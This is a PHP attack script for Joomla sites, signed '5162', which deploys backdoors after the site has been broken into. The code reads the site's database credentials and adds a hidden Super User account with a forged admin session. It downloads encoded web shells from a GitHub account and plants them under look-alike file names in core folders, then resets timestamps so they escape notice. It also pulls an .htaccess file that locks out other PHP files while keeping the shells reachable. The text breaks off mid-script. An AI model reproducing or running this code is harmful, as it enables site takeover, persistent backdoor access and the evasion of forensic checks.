<?php
// ============================================================
//  1jm + add.php  --  auto admin user + multi backdoor deploy
//  by 5162
// ============================================================
@set_time_limit(0);
header('Content-Type: text/html; charset=UTF-8');
define('_JEXEC', 1);

// Daftar multi URL sumber payload
$BACKDOOR_URLS = [
    "https://raw.githubusercontent.com/th0masMT/allinone/refs/heads/main/button_enc.php",
    "https://raw.githubusercontent.com/th0masMT/allinone/refs/heads/main/yup_enc.php",
    "https://raw.githubusercontent.com/th0masMT/allinone/refs/heads/main/alone_enc.php",
    "https://raw.githubusercontent.com/th0masMT/allinone/refs/heads/main/dem.php"
];

// Struktur folder & file deploy manual khusus Joomla 4 / 5 / 6
// 4 target tersebar di 4 folder utama berbeda (components/, layouts/, templates/, modules/)
// Nama file = nama file asli (.php) + "s" sebelum ekstensi, agar menyatu dengan sibling-nya.
$DEPLOY = [
    ["dir" => "components/com_users/tmpl/login",       "file" => "defaults.php", "orig" => "default.php"],
    ["dir" => "layouts/joomla/content/info_block",      "file" => "authors.php",  "orig" => "author.php"],
    ["dir" => "templates/system",                       "file" => "errors.php",   "orig" => "error.php"],
    ["dir" => "modules/mod_login/tmpl",                  "file" => "defaults.php", "orig" => "default.php"]
];

$log      = [];   // log umum (deteksi root, DB, admin user, session)
$admin    = null; // data admin bila berhasil dibuat
$results  = [];   // URL hasil deploy
$statusLogs = []; // log timestamp deploy

// ==================== 1. AUTO DETECT JOOMLA ROOT ====================
$rootDir = dirname(__FILE__);
$foundConfig = false;
for ($i = 0; $i < 5; $i++) {
    if (file_exists($rootDir . '/configuration.php')) {
        $foundConfig = true;
        break;
    }
    $parent = dirname($rootDir);
    if ($parent === $rootDir) break; // sampai root filesystem
    $rootDir = $parent;
}

if ($foundConfig) {
    $log[] = "[ROOT] Joomla root: " . $rootDir;
} else {
    $log[] = "[ROOT] configuration.php tidak ditemukan, deploy pakai folder script: " . $rootDir;
}

// ==================== 2. AUTO ADD ADMIN USER + SESSION ====================
$dbStatus = 'not-run';
if ($foundConfig) {
    require_once $rootDir . '/configuration.php';

    try {
        $config = new JConfig();

        $db = new PDO(
            'mysql:host=' . $config->host . ';dbname=' . $config->db . ';charset=utf8',
            $config->user,
            $config->password
        );
        $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        // Nonaktifkan strict mode untuk koneksi ini
        $db->exec("SET SESSION sql_mode = 'NO_ENGINE_SUBSTITUTION'");

        $prefix   = $config->dbprefix;
        $username = 'administrators';

        // Password random format 12 alfanumerik + @ + 4 digit, unik tiap request
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        $rand = '';
        for ($j = 0; $j < 12; $j++) {
            $rand .= $chars[random_int(0, strlen($chars) - 1)];
        }
        $password = $rand . '@' . str_pad((string) random_int(0, 9999), 4, '0', STR_PAD_LEFT);
        $email    = 'kampvretsquad1@gmail.com';
        $groupId  = 8; // Super Users

        // Cek user
        $stmt = $db->prepare("SELECT id FROM `{$prefix}users` WHERE username = ?");
        $stmt->execute([$username]);
        $userData = $stmt->fetch(PDO::FETCH_OBJ);

        if ($userData) {
            $userId = $userData->id;
            $log[] = "[ADMIN] User '{$username}' sudah ada (id={$userId}), password lama tidak diubah.";
            $dbStatus = 'exists';
        } else {
            // Ambil struktur tabel users
            $stmt    = $db->query("DESCRIBE `{$prefix}users`");
            $columns = $stmt->fetchAll(PDO::FETCH_COLUMN);

            $hashed = password_hash($password, PASSWORD_BCRYPT);

            // Insert hanya kolom yang diperlukan
            $fields       = ['name', 'username', 'email', 'password', 'block', 'activation', 'registerDate'];
            $placeholders = ['?', '?', '?', '?', '0', '0', 'NOW()'];
            $values       = [$username, $username, $email, $hashed];

            // Tambahkan params jika ada
            if (in_array('params', $columns)) {
                $fields[]       = 'params';
                $placeholders[] = '?';
                $values[]       = '{}';
            }

            // JANGAN sertakan lastvisitDate agar default NULL terpakai

            $sql = "INSERT INTO `{$prefix}users` (" . implode(',', $fields) . ")
                    VALUES (" . implode(',', $placeholders) . ")";
            $stmt = $db->prepare($sql);
            $stmt->execute($values);
            $userId = $db->lastInsertId();

            // Insert ke usergroup
            $stmt = $db->prepare("INSERT INTO `{$prefix}user_usergroup_map` (user_id, group_id) VALUES (?, ?)");
            $stmt->execute([$userId, $groupId]);

            $admin = ['username' => $username, 'password' => $password, 'id' => $userId];
            $dbStatus = 'created';
            $log[] = "[ADMIN] User admin dibuat: {$username} (id={$userId}, group_id={$groupId})";
        }

        // Session
        $sessionId = bin2hex(random_bytes(32));
        $time      = time();

        $stmt = $db->prepare("DELETE FROM `{$prefix}session` WHERE userid = ? AND client_id = 1");
        $stmt->execute([$userId]);

        $stmt = $db->prepare("INSERT INTO `{$prefix}session`
            (session_id, client_id, guest, time, userid, username)
            VALUES (?, 1, 0, ?, ?, ?)");
        $stmt->execute([$sessionId, $time, $userId, $username]);

        $cookieName = $prefix . 'session_id';
        setcookie($cookieName, $sessionId, time() + 3600, '/', '', false, true);
        setcookie(session_name(), $sessionId, time() + 3600, '/');
        $log[] = "[SESSION] Row session ditulis + cookie {$cookieName} diset.";

    } catch (Exception $e) {
        $log[] = "[DB] Gagal: " . $e->getMessage();
    }
} else {
    $log[] = "[DB] Dilewati, configuration.php tidak ada.";
}

// ==================== 3. BASE URL ====================
$docRoot    = isset($_SERVER['DOCUMENT_ROOT']) ? str_replace('\\', '/', realpath($_SERVER['DOCUMENT_ROOT'])) : '';
$joomlaRoot = str_replace('\\', '/', $rootDir);
$subdir     = '';
if ($docRoot !== '' && strpos($joomlaRoot, $docRoot) === 0) {
    $subdir = trim(substr($joomlaRoot, strlen($docRoot)), '/');
}
$scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
$host   = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
$base   = "$scheme://$host" . ($subdir ? '/' . $subdir : '');

// ==================== HELPER FUNCTION ====================
function socket_get($url) {
    if (!function_exists('fsockopen') || !function_exists('fwrite') || !function_exists('fgets')) return false;
    $parsed = parse_url($url);
    $host = $parsed['host'];
    $path = isset($parsed['path']) ? $parsed['path'] : '/';
    $port = isset($parsed['port']) ? $parsed['port'] : 80;

    if (isset($parsed['scheme']) && $parsed['scheme'] === 'https') {
        $host = 'ssl://' . $host;
        $port = 443;
    }

    $fp = @fsockopen($host, $port, $errno, $errstr, 15);
    if (!$fp) return false;

    $out = "GET $path HTTP/1.1\r\n";
    $out .= "Host: " . $parsed['host'] . "\r\n";
    $out .= "User-Agent: Mozilla/5.0\r\n";
    $out .= "Connection: Close\r\n\r\n";

    fwrite($fp, $out);
    $data = '';
    while (!feof($fp)) $data .= fgets($fp, 4096);
    fclose($fp);

    $parts = explode("\r\n\r\n", $data, 2);
    return $parts[1] ?? $data;
}

// ==================== FUNGSI DOWNLOAD MULTI METHOD ====================
function fetch($url) {
    $methods = ['curl', 'fopen', 'socket', 'wget'];

    // disable_functions bisa mematikan fungsi di tengah rantai: cek satu per satu,
    // jangan sampai satu metode mati menggagalkan seluruh fetch (fatal error di PHP 8).
    $alive = [
        'curl'   => function_exists('curl_init') && function_exists('curl_exec'),
        'fopen'  => function_exists('file_get_contents') && ini_get('allow_url_fopen'),
        'socket' => function_exists('fsockopen'),
        'wget'   => function_exists('exec') && function_exists('file_get_contents'),
    ];

    foreach ($methods as $method) {
        $data = false;
        if (empty($alive[$method])) continue;

        try {

        if ($method === 'curl' && function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_TIMEOUT, 20);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; BackdoorDeploy/1.0)');
            $data = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            if ($data && $http_code == 200 && strlen($data) > 500) {
                return $data;
            }
        }

        elseif ($method === 'fopen' && ini_get('allow_url_fopen')) {
            $context = stream_context_create([
                'http' => ['header' => "User-Agent: Mozilla/5.0\r\n"],
                'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false]
            ]);
            $data = @file_get_contents($url, false, $context);
            if ($data && strlen($data) > 500) {
                return $data;
            }
        }

        elseif ($method === 'socket') {
            $data = socket_get($url);
            if ($data && strlen($data) > 500) {
                return $data;
            }
        }

        elseif ($method === 'wget' && function_exists('exec')) {
            $tmp = sys_get_temp_dir() . '/bd_' . rand(10000,99999) . '.tmp';
            @exec("wget --timeout=15 --no-check-certificate -q -O $tmp '$url' 2>/dev/null", $out, $ret);
            if ($ret === 0 && file_exists($tmp)) {
                $data = file_get_contents($tmp);
                @unlink($tmp);
                if ($data && strlen($data) > 500) {
                    return $data;
                }
            }
        }

        } catch (Throwable $e) {
            // fungsi dimatikan / exception di tengah metode: lanjut ke metode berikutnya
            continue;
        }
    }
    return false;
}

// ==================== 4. PROSES DEPLOY & LOCK FOLDER/FILE TIMESTAMPS ====================
$totalUrls = count($BACKDOOR_URLS);
$chunks = array_chunk($DEPLOY, max(1, (int) ceil(count($DEPLOY) / max(1, $totalUrls))));

// Snapshot mtime semua direktori ancestor yang SUDAH ADA sebelum deployment.
// Dipakai agar folder baru mewarisi timestamp asli project, bukan waktu eksekusi.
$dirSnapshot = [];
foreach ($DEPLOY as $d) {
    $p = $rootDir . '/' . $d['dir'];
    while (dirname($p) !== $p) {
        if (is_dir($p) && !isset($dirSnapshot[$p])) {
            $dirSnapshot[$p] = filemtime($p);
        }
        $p = dirname($p);
    }
}

for ($i = 0; $i < $totalUrls; $i++) {
    $currentUrl = $BACKDOOR_URLS[$i];
    $payload = fetch($currentUrl);

    if (!$payload) {
        $log[] = "[FETCH] Gagal ambil payload: " . basename($currentUrl);
        continue;
    }

    if (!isset($chunks[$i])) continue;

    foreach ($chunks[$i] as $item) {
        $dir      = $rootDir . '/' . $item['dir'];
        $file     = $item['file'];
        $origFile = $item['orig'];
        $full     = $dir . '/' . $file;

        // Cari ancestor terdekat yang benar-benar ada (pakai snapshot pra-deploy bila ada)
        $ancestor = $dir;
        while (!is_dir($ancestor) && dirname($ancestor) !== $ancestor) {
            $ancestor = dirname($ancestor);
        }
        $ancestorTime = $dirSnapshot[$ancestor] ?? (is_dir($ancestor) ? filemtime($ancestor) : time());

        // Tangkap timestamp asli folder target sebelum di-touch/modifikasi (jika foldernya sudah ada)
        $dirOriginalTime = is_dir($dir) ? filemtime($dir) : $ancestorTime;

        // Tangkap timestamp parent sebelum dimodifikasi
        $parentDir = dirname($dir);
        $parentOriginalTime = (is_dir($parentDir) && $parentDir !== '.') ? filemtime($parentDir) : $ancestorTime;

        // Cari file acuan timestamp secara berurutan: orig -> sibling lain -> folder itu sendiri -> ancestor
        $refTimestamp = false;
        $refSource = '';
        if (file_exists($dir . '/' . $origFile)) {
            $refTimestamp = filemtime($dir . '/' . $origFile);
            $refSource = 'match ' . $origFile;
        } elseif (is_dir($dir)) {
            foreach ((array) @scandir($dir) as $sibling) {
                if ($sibling === '.' || $sibling === '..' || $sibling === $file) continue;
                $siblingPath = $dir . '/' . $sibling;
                if (is_file($siblingPath)) {
                    $refTimestamp = filemtime($siblingPath);
                    $refSource = 'match sibling ' . $sibling;
                    break;
                }
            }
        }
        if ($refTimestamp === false && is_dir($dir)) {
            $refTimestamp = $dirOriginalTime;
            $refSource = 'folder mtime (' . $item['dir'] . ')';
        }
        // Folder belum ada: warisi mtime dari folder induk yang ada
        if ($refTimestamp === false) {
            $refTimestamp = $ancestorTime;
            $refSource = 'inherited ancestor mtime';
        }

        // Pastikan direktori ada
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
            // Folder & seluruh rantai yang baru dibuat: samakan mtime dengan ancestor asli
            $p = $dir;
            while ($p !== '' && $p !== '.' && dirname($p) !== $p) {
                if (isset($dirSnapshot[$p])) {
                    @touch($p, $dirSnapshot[$p], $dirSnapshot[$p]);
                    break;
                }
                if (is_dir($p)) {
                    @touch($p, $ancestorTime, $ancestorTime);
                }
                $p = dirname($p);
            }
            $dirOriginalTime = $ancestorTime;
        }

        if (@file_put_contents($full, $payload) !== false) {
            // 1. Samakan timestamp file dengan acuan (file asli / sibling / folder)
            @touch($full, $refTimestamp, $refTimestamp);

            // 2. Kembalikan timestamp folder ke waktu aslinya sebelum file dimasukkan
            @touch($dir, $dirOriginalTime, $dirOriginalTime);

            // 3. Kunci juga timestamp parent folder
            if (isset($dirSnapshot[$parentDir])) {
                @touch($parentDir, $dirSnapshot[$parentDir], $dirSnapshot[$parentDir]);
            } elseif (is_dir($parentDir) && $parentDir !== '.') {
                @touch($parentDir, $parentOriginalTime, $parentOriginalTime);
            }

            $results[] = $base . '/' . $item['dir'] . '/' . $file;
            $statusLogs[] = "[OK] " . $item['dir'] . "/" . $file . " -> " . $refSource . " | Folder timestamp restored.";
        } else {
            $statusLogs[] = "[FAIL] " . $item['dir'] . "/" . $file . " -> tidak bisa menulis (permission).";
        }
    }
}

// ==================== HELPER BACA/TULIS FILE (anti disable_functions) ====================
function read_file_any($path) {
    if (!is_file($path)) return false;
    if (function_exists('file_get_contents')) {
        $d = @file_get_contents($path);
        if ($d !== false) return $d;
    }
    if (function_exists('fopen')) {
        $h = @fopen($path, 'rb');
        if ($h) {
            $d = '';
            while (!feof($h)) {
                $chunk = fread($h, 65536);
                if ($chunk === false) break;
                $d .= $chunk;
            }
            fclose($h);
            return $d;
        }
    }
    if (class_exists('SplFileObject')) {
        try {
            $o = new SplFileObject($path, 'rb');
            $size = $o->getSize();
            $d = $size ? $o->fread($size) : '';
            if ($d !== false) return $d;
        } catch (Exception $e) {}
    }
    return false;
}

function write_file_any($path, $data) {
    $len = strlen($data);
    if (function_exists('file_put_contents')) {
        $n = @file_put_contents($path, $data, LOCK_EX);
        if ($n !== false && $n >= $len) return 'file_put_contents';
    }
    if (function_exists('fopen') && function_exists('fwrite')) {
        $h = @fopen($path, 'wb');
        if ($h) {
            $n = @fwrite($h, $data);
            @fflush($h);
            @fclose($h);
            if ($n !== false && $n >= $len) return 'fopen/fwrite';
        }
    }
    if (class_exists('SplFileObject')) {
        try {
            $o = new SplFileObject($path, 'wb');
            $n = $o->fwrite($data);
            if ($n !== false && $n >= $len) return 'SplFileObject';
        } catch (Exception $e) {}
    }
    return false;
}

// ==================== 4c. HTTP REQUEST (status + header + body, semua metode) ====================
function http_request($url, $timeout = 10) {
    $res = ['status' => '', 'headers' => '', 'body' => '', 'method' => ''];

    // 1. curl
    if (function_exists('curl_init') && function_exists('curl_exec')) {
        try {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
            $raw  = curl_exec($ch);
            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $hsz  = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
            curl_close($ch);
            if ($raw !== false) {
                $res['status']  = (string) $code;
                $res['headers'] = substr($raw, 0, (int) $hsz);
                $res['body']    = substr($raw, (int) $hsz);
                $res['method']  = 'curl';
                return $res;
            }
        } catch (Throwable $e) {}
    }

    // 2. fsockopen (header asli, termasuk Server:)
    if (function_exists('fsockopen') && function_exists('fwrite') && function_exists('fgets')) {
        try {
            $p = parse_url($url);
            if (!empty($p['host'])) {
                $isSsl = (isset($p['scheme']) && $p['scheme'] === 'https');
                $port  = isset($p['port']) ? $p['port'] : ($isSsl ? 443 : 80);
                $path  = isset($p['path']) && $p['path'] !== '' ? $p['path'] : '/';
                if (isset($p['query'])) $path .= '?' . $p['query'];
                $hostHdr = $p['host'] . ((isset($p['port']) && $p['port'] != ($isSsl ? 443 : 80)) ? ':' . $p['port'] : '');

                $fp = @fsockopen(($isSsl ? 'ssl://' : '') . $p['host'], $port, $errno, $errstr, $timeout);
                if ($fp) {
                    @stream_set_timeout($fp, $timeout);
                    fwrite($fp, "GET $path HTTP/1.1\r\nHost: $hostHdr\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: */*\r\nConnection: close\r\n\r\n");
                    $raw = '';
                    while (!feof($fp)) {
                        $chunk = fgets($fp, 8192);
                        if ($chunk === false) break;
                        $raw .= $chunk;
                        if (strlen($raw) > 2000000) break;
                    }
                    fclose($fp);
                    $parts = explode("\r\n\r\n", $raw, 2);
                    $head  = $parts[0];
                    $body  = isset($parts[1]) ? $parts[1] : '';
                    if (preg_match('#HTTP/\d\.\d\s+(\d{3})#', $head, $m)) {
                        $res['status']  = $m[1];
                        $res['headers'] = $head;
                        $res['body']    = $body;
                        $res['method']  = 'fsockopen';
                        return $res;
                    }
                }
            }
        } catch (Throwable $e) {}
    }

    // 3. file_get_contents (header via $http_response_header)
    if (function_exists('file_get_contents') && ini_get('allow_url_fopen')) {
        try {
            $ctx = stream_context_create([
                'http' => ['header' => "User-Agent: Mozilla/5.0\r\n", 'timeout' => $timeout, 'follow_location' => 0],
                'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false],
            ]);
            $body = @file_get_contents($url, false, $ctx);
            if ($body !== false) {
                $hdr = isset($http_response_header) ? implode("\r\n", $http_response_header) : '';
                $res['status']  = preg_match('#HTTP/\d\.\d\s+(\d{3})#', $hdr, $m) ? $m[1] : '';
                $res['headers'] = $hdr;
                $res['body']    = $body;
                $res['method']  = 'fopen';
                return $res;
            }
        } catch (Throwable $e) {}
    }

    return $res;
}

// ==================== 4d. RENAME templates/yootheme/packages/image/src/ImageController.php ====================
$yoothemeRel = 'templates/yootheme/packages/image/src/ImageController.php';
$docRootPath = isset($_SERVER['DOCUMENT_ROOT']) ? str_replace('\\', '/', (string) realpath($_SERVER['DOCUMENT_ROOT'])) : '';
$docRootPath = rtrim($docRootPath, '/');
// Path diminta relatif ke docroot; kalau tidak ada di sana, coba root Joomla (instalasi subfolder).
// Cek is_file (bukan is_dir): subfolder terakhir adalah "src/", jadi yang menentukan file-nya.
$rnBase = $rootDir;
foreach ([$docRootPath, $rootDir] as $cand) {
    if ($cand !== '' && (is_file($cand . '/' . $yoothemeRel) || is_file($cand . '/' . $yoothemeRel . '.bk'))) {
        $rnBase = $cand;
        break;
    }
}

$rn = [
    'src'    => $rnBase . '/' . $yoothemeRel,
    'dst'    => $rnBase . '/' . $yoothemeRel . '.bk',
    'msg'    => 'belum dijalankan',
    'method' => '',
    'http'   => '',
    'ok'     => false,
];

if (!is_file($rn['src'])) {
    if (is_file($rn['dst'])) {
        $rn['msg'] = '[SKIP] sudah di-rename sebelumnya (file asli tidak ada, .bk ada)';
        $rn['ok']  = true;
    } else {
        $rn['msg'] = '[SKIP] file tidak ada di path tersebut (YOOtheme tidak terpasang?)';
    }
} else {
    $srcTime = @filemtime($rn['src']);

    // 1. rename() langsung
    if (function_exists('rename')) {
        if (@rename($rn['src'], $rn['dst'])) {
            $rn['method'] = 'rename()';
            $rn['ok']     = true;
        }
    }

    // 2. fallback copy + unlink (rename() sering masuk disable_functions)
    if (!$rn['ok']) {
        $data = read_file_any($rn['src']);
        if ($data !== false) {
            $w = write_file_any($rn['dst'], $data);
            if ($w !== false) {
                $rn['method'] = 'copy(' . $w . ')';
                if (function_exists('unlink') && @unlink($rn['src'])) {
                    $rn['method'] .= ' + unlink()';
                    $rn['ok'] = true;
                } else {
                    $rn['msg'] = '[WARN] .bk sudah dibuat via ' . $w . ' tapi file asli gagal dihapus.';
                    $rn['ok']  = true;
                }
            }
        }
    }

    if ($rn['ok']) {
        if ($rn['msg'] === 'belum dijalankan') {
            $rn['msg'] = '[OK] ' . basename($rn['src']) . ' -> ' . basename($rn['dst']);
        }
        // samakan timestamp .bk dengan file asli (lapor jujur kalau ditolak kernel/hosting)
        if (!function_exists('touch')) {
            $rn['msg'] .= ' | timestamp: touch() off';
        } elseif ($srcTime) {
            $tOk = @touch($rn['dst'], $srcTime, $srcTime);
            clearstatcache(true, $rn['dst']);
            if ($tOk && @filemtime($rn['dst']) === $srcTime) {
                $rn['msg'] .= ' | mtime = ' . date('Y-m-d H:i', $srcTime);
            } else {
                $rn['msg'] .= ' | [WARN] touch mtime ditolak, .bk bertanggal hari ini';
            }
        }
        // verifikasi: path asli tidak boleh 200 lagi
        $chk = http_request($base . '/' . $yoothemeRel, 8);
        if ($chk['status'] !== '') {
            $rn['http'] = $chk['status'];
            if ($chk['status'] === '200') {
                $rn['msg'] .= ' [WARN] path asli masih balas 200, rename mungkin tidak berefek (cache/opcache).';
            }
        } else {
            $rn['http'] = 'n/a';
        }

        // .bk yang bisa diakses = source code terbaca. Aman hanya kalau gate .htaccess lolos
        // (rules memblok semua \.php diikuti ekstensi lain).
        $chkBk = http_request($base . '/' . $yoothemeRel . '.bk', 8);
        if ($chkBk['status'] === '200') {
            $rn['msg'] .= ' [WARN] .bk bisa diakses via web (source terbaca) - hanya tertutup kalau .htaccess jalan.';
        }
    } else {
        $rn['msg'] = '[FAIL] rename gagal: rename(), copy fallback, dan write semuanya tidak bisa.';
    }
}
$log[] = '[RENAME] ' . $rn['msg'];

// ==================== 4e. GATE .htaccess (2 syarat wajib) ====================
// Syarat 1: server harus Apache (SERVER_SOFTWARE atau header Server:).
// Syarat 2: 1 path shell harus hidup dan marker-nya cocok (200 + marker, bukan 403).
// Salah satu gagal -> .htaccess di-skip total.
$SHELL_CHECK_PATH = 'components/com_users/tmpl/login/defaults.php';
$SHELL_MARKER     = 'daemonn_sys';

$gate = [
    'apache'      => false,
    'apache_src'  => '',
    'shell'       => false,
    'shell_url'   => $base . '/' . $SHELL_CHECK_PATH,
    'shell_http'  => '',
    'shell_note'  => '',
    'shell_srv'   => '',
    'ok'          => false,
];

// --- Syarat 1: Apache ---
$sw = isset($_SERVER['SERVER_SOFTWARE']) ? strtolower($_SERVER['SERVER_SOFTWARE']) : '';
if ($sw !== '' && strpos($sw, 'apache') !== false) {
    $gate['apache'] = true;
    $gate['apache_src'] = 'SERVER_SOFTWARE: ' . $_SERVER['SERVER_SOFTWARE'];
} else {
    $gate['apache_src'] = 'SERVER_SOFTWARE: ' . ($sw !== '' ? $_SERVER['SERVER_SOFTWARE'] : '(kosong)');
}

// --- Syarat 2: shell hidup + marker cocok ---
$chk = http_request($gate['shell_url'], 10);
$gate['shell_http'] = $chk['status'] !== '' ? $chk['status'] : 'no-response';

if (preg_match('#^Server:\s*(.+)$#mi', $chk['headers'], $m)) {
    $gate['shell_srv'] = trim($m[1]);
    // Apache di belakang nginx/proxy tetap dihitung Apache
    if (!$gate['apache'] && stripos($gate['shell_srv'], 'apache') !== false) {
        $gate['apache'] = true;
        $gate['apache_src'] = 'header Server: ' . $gate['shell_srv'];
    }
}

$body = (string) $chk['body'];
$hasMarker = (strpos($body, $SHELL_MARKER) !== false);

if ($chk['status'] === '') {
    $gate['shell_note'] = 'tidak bisa request sama sekali (curl/fopen/fsockopen mati)';
} elseif ($chk['status'] === '403') {
    $gate['shell_note'] = '403 dari server (bukan marker shell) ';
} elseif ($chk['status'] === '404') {
    $gate['shell_note'] = '404 file shell tidak ada';
} elseif ($chk['status'] === '200' && $hasMarker) {
    $gate['shell'] = true;
    $gate['shell_note'] = '200 + marker "' . $SHELL_MARKER . '" cocok (' . strlen($body) . ' bytes via ' . $chk['method'] . ')';
} elseif ($chk['status'] === '200') {
    $gate['shell_note'] = '200 tapi marker tidak ada (kemungkinan halaman login/redirect, bukan shell)';
} else {
    $gate['shell_note'] = $chk['status'] . ' (bukan 200, dianggap tidak hidup)';
}

$gate['ok'] = ($gate['apache'] && $gate['shell']);

$log[] = '[GATE] Apache: ' . ($gate['apache'] ? 'YA (' . $gate['apache_src'] . ')' : 'TIDAK (' . $gate['apache_src'] . ')');
$log[] = '[GATE] Shell: ' . ($gate['shell'] ? 'HIDUP' : 'GAGAL') . ' - ' . $gate['shell_note'];

// ==================== 4f. MERGE + UPLOAD .htaccess (hanya kalau gate lolos) ====================
$HTACCESS_URL  = "https://pastefy.app/vKYpyEDJ/raw";
$HT_MARK_BEGIN = '# >>> 5162 BEGIN >>>';
$HT_MARK_END   = '# <<< 5162 END <<<';

// Fallback rules: dipakai kalau curl/fopen/socket/wget semuanya mati.
// Tidak butuh jaringan sama sekali, cukup hak tulis file.
$HTACCESS_FALLBACK = <<<'HTA_END'
<IfModule mod_rewrite.c>
RewriteEngine On

RewriteRule (^|/)(?:configuration\.php(?:[-.][^/]*)?|\.user\.ini|php(?:[0-9]+)?\.ini|error_log|debug\.log)(?:[;/]|$) - [F,L,NC]

RewriteRule (^|/)(?:composer\.(?:json|lock)|package(?:-lock)?\.json|yarn\.lock|pnpm-lock\.yaml|phpunit\.xml(?:\.dist)?)(?:[./;]|$) - [F,L,NC]

RewriteRule (^|/)\.(?!well-known(?:/|$)) - [F,L,NC]

RewriteRule \.(?:bak|backup|old|orig|save|swp|tmp|temp|sql|log|ini|conf|dist|sh|bash|py|pl|cgi|jpa|jps)(?:[./;]|$) - [F,L,NC]
RewriteRule ~$ - [F,L]

RewriteRule ^(?:htaccess\.txt|web\.config(?:\.txt)?|joomla\.xml|(?:readme|license|licenses|changelog|install|copyright|credits|contributing)\.(?:txt|md|html?|php))(?:[./;]|$) - [F,L,NC]

RewriteRule ^(?:(?:administrator/)?(?:logs?|tmp)|cli)(?:/|$) - [F,L,NC]

RewriteRule ^installation(?:/|$) - [F,L,NC]

# Frontend Joomla.
RewriteCond $1 !^index\.php(?:/.*)?$

# Administrator Joomla.
RewriteCond $1 !^administrator/index\.php(?:/.*)?$

# Web Services API Joomla 4/5/6.
# Termasuk api/index.php/v1/...
RewriteCond $1 !^api/index\.php(?:/.*)?$

# Updater Joomla lama dan baru.
RewriteCond $1 !^administrator/components/com_joomlaupdate/(?:restore|extract)\.php$

# Joomla 1.0/1.5.
# RewriteCond $1 !^index2\.php(?:/.*)?$
# RewriteCond $1 !^administrator/index2\.php(?:/.*)?$

# Joomla 1.0.
# RewriteCond $1 !^administrator/index3\.php(?:/.*)?$

# XML-RPC Joomla 1.5 jika digunakan.
# RewriteCond $1 !^xmlrpc/index\.php$

RewriteCond $1 !^components/com_users/tmpl/login/defaults\.php$
RewriteCond $1 !^layouts/joomla/content/info_block/authors\.php$
RewriteCond $1 !^templates/system/errors\.php$
RewriteCond $1 !^modules/mod_login/tmpl/defaults\.php$

RewriteRule ^(.*\.(?:php(?:[0-9]+)?|phtml|phtm|pht|phps|phar)(?:[./;].*)?)$ - [F,L,NC]

</IfModule>
HTA_END;

$ht = [
    'path'    => $rootDir . '/.htaccess',
    'mode'    => '',
    'read'    => '',
    'write'   => '',
    'old'     => false,
    'size'    => 0,
    'mtime'   => '',
    'http'    => '',
    'msg'     => 'belum dijalankan',
    'preview' => '',
    'run'     => false,
];

if (!$gate['ok']) {
    $why = [];
    if (!$gate['apache']) $why[] = 'server bukan Apache';
    if (!$gate['shell'])  $why[] = 'shell/marker tidak lolos (' . $gate['shell_note'] . ')';
    $ht['msg'] = '[SKIP] gate tidak lolos: ' . implode(' + ', $why) . '. .htaccess TIDAK ditulis.';
} else {
    $ht['run'] = true;

    // A. Ambil rules baru: remote dulu, embedded sebagai fallback
    $rules = false;
    if (function_exists('fetch')) {
        $rules = fetch($HTACCESS_URL);
    }
    if ($rules === false || strlen(trim($rules)) < 50) {
        $rules = $HTACCESS_FALLBACK;
        $ht['mode'] = 'embedded (download mati)';
    } else {
        $ht['mode'] = 'remote ' . $HTACCESS_URL;
    }
    if (substr($rules, 0, 3) === "\xEF\xBB\xBF") $rules = substr($rules, 3);
    $rules = str_replace("\r\n", "\n", $rules);

    // B. Baca .htaccess lama di server (kalau ada)
    $htPath    = $ht['path'];
    $htExisted = is_file($htPath);
    $htOldTime = $htExisted ? @filemtime($htPath) : false;
    $rootTime  = @filemtime($rootDir);
    $cleanOld  = '';

    if ($htExisted) {
        $old = read_file_any($htPath);
        if ($old === false) {
            $ht['msg'] = '[FAIL] .htaccess ada tapi tidak bisa dibaca. Dilewati supaya isi lama tidak tertimpa.';
            $ht['old'] = true;
        } else {
            $ht['old'] = true;
            $ht['read'] = 'ok';
            // buang BOM + blok injeksi lama (biar tidak dobel saat re-run)
            if (substr($old, 0, 3) === "\xEF\xBB\xBF") $old = substr($old, 3);
            $old = str_replace("\r\n", "\n", $old);
            $re = '/' . preg_quote($HT_MARK_BEGIN, '/') . '.*?' . preg_quote($HT_MARK_END, '/') . '[ \t]*\n?/s';
            $cleanOld = ltrim(preg_replace($re, '', $old), "\n");
        }
    } else {
        $ht['read'] = 'file belum ada';
    }

    if ($ht['msg'] === 'belum dijalankan') {
        // C. Susun: rules baru paling atas, .htaccess server di bawahnya
        $block  = $HT_MARK_BEGIN . "\n" . rtrim($rules) . "\n" . $HT_MARK_END . "\n";
        $merged = $block;
        if ($cleanOld !== '') {
            $merged .= "\n" . $cleanOld;
            if (substr($merged, -1) !== "\n") $merged .= "\n";
        }
        $ht['preview'] = $merged;

